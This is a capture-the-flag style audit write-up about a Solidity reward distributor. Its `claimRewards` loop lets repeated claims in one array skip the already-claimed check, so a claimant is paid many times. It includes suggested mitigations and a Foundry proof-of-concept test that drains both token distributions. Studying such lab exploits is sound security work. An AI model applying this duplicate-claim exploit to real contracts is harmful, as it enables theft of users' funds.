## Passing continuous-repeated claims to `claimRewards` allows each claim to be executed without checking or registering if it has already been claimed.

The `claimRewards` function loops through each claim in the `inputClaims` array. Each claim goes through the following conditional statements:
```solidity
///// First if/else block
if (token != inputTokens[inputClaim.tokenIndex]) {
    if (address(token) != address(0)) {
        if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
    }
    token = inputTokens[inputClaim.tokenIndex];
    bitsSet = 1 << bitPosition;
    amount = inputClaim.amount;
} else { 
    bitsSet = bitsSet | 1 << bitPosition; 
    amount += inputClaim.amount;
}

///// second if block
if (i == inputClaims.length - 1) {
    if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
}
```

**Let's evaluate the behavior of these conditionals on each iteration of an array with repeated claims:**
1. It enters the first `if`, but token is `address(0)`, so `_setClaimed` is not executed. The second `if` is not triggered.
2. It enters the `else` block, modifies some variables, but `_setClaimed` is not called. The second `if` is not triggered.


The second iteration is repeated until the last item of the array, when the second `if` is finally triggered, executing `_setClaimed`.

The `_setClaimed` function is in charge of updating the state to register a user's claim. It also returns `false` if the user has already claimed, which causes a revert.

So, with the current logic, if we pass repeated claims, the claim checks are only executed when we reach the last item of the array or when the claim token changes for the next claim in the list.

This means that the corresponding reward will be transferred to the claimant multiple times without checking if it's already claimed, allowing a claimant to take more tokens than planned, leading to fund drainings.

**DEV NOTE:** I think this could be considered a type of reentrancy (maybe an "in-function reentrancy" or "loop reentrancy" or "single-call reentrancy") because it transfers the tokens, and then on the next loop, it "reenters" before the state is updated or checks are performed. So it is violating the CEI pattern: it is Interacting (transferring) to then Check and apply the Effects (ICE) at the end of the transaction. For future audits, look for CEI pattern faults on loops. 

**Recommended mitigation**
- Do not allow repeated claims in the claims array. For example, check for repeated batch numbers and token addresses (the token address, not the index, because repeated tokens can also be passed in the tokens array).
- Execute `_setClaimed` in each loop before the transfer, to update and check if it has already been claimed.

Depending on the effectiveness of each option and the behavior in gas consumption, it might be good to implement one of them or both.

### PoC 
```solidity
    function test_theRewarder() public 
    checkSolvedByPlayer 
    {
        //// Constants and claims
        uint256 claimAmountDVT = 11524763827831882; // took from json
        uint256 claimAmountWeth = 1171088749244340; // took from json
        uint256 leaveIndexDVT = 188; // took from json
        uint256 leaveIndexWeth = 188; // took from json
        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");

        Claim memory dvtClaim = Claim({
            batchNumber: 0, 
            amount: claimAmountDVT,
            tokenIndex: 0, 
            proof: merkle.getProof(dvtLeaves, leaveIndexDVT)
        });

        Claim memory wethClaim = Claim({
            batchNumber: 0,
            amount: claimAmountWeth,
            tokenIndex: 1, 
            proof: merkle.getProof(wethLeaves, leaveIndexWeth)
        });

        //// Count how many times could we repeat the same claim
        uint256 dvtCount; 
        while (dvtCount*claimAmountDVT < TOTAL_DVT_DISTRIBUTION_AMOUNT) dvtCount++;
        uint256 wethCount; 
        while (wethCount*claimAmountWeth < TOTAL_WETH_DISTRIBUTION_AMOUNT) wethCount++;
        
        // substract 1 cause the while stops AFTER passing the max multiple
        dvtCount--;
        wethCount--;

        //// creating claims array
        Claim[] memory claims = new Claim[](dvtCount+wethCount);

        for(uint256 i = 0; i<claims.length; i++){
            if(i<dvtCount) claims[i] = dvtClaim;
            else claims[i] = wethClaim;
        }

        ///// Set DVT and WETH as tokens to claim
        IERC20[] memory tokensToClaim = new IERC20[](2);
        tokensToClaim[0] = IERC20(address(dvt));
        tokensToClaim[1] = IERC20(address(weth));

        //// Claim
        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});

        // transfer to recovery
        dvt.transfer(recovery, dvt.balanceOf(player));
        weth.transfer(recovery, weth.balanceOf(player));
    }
```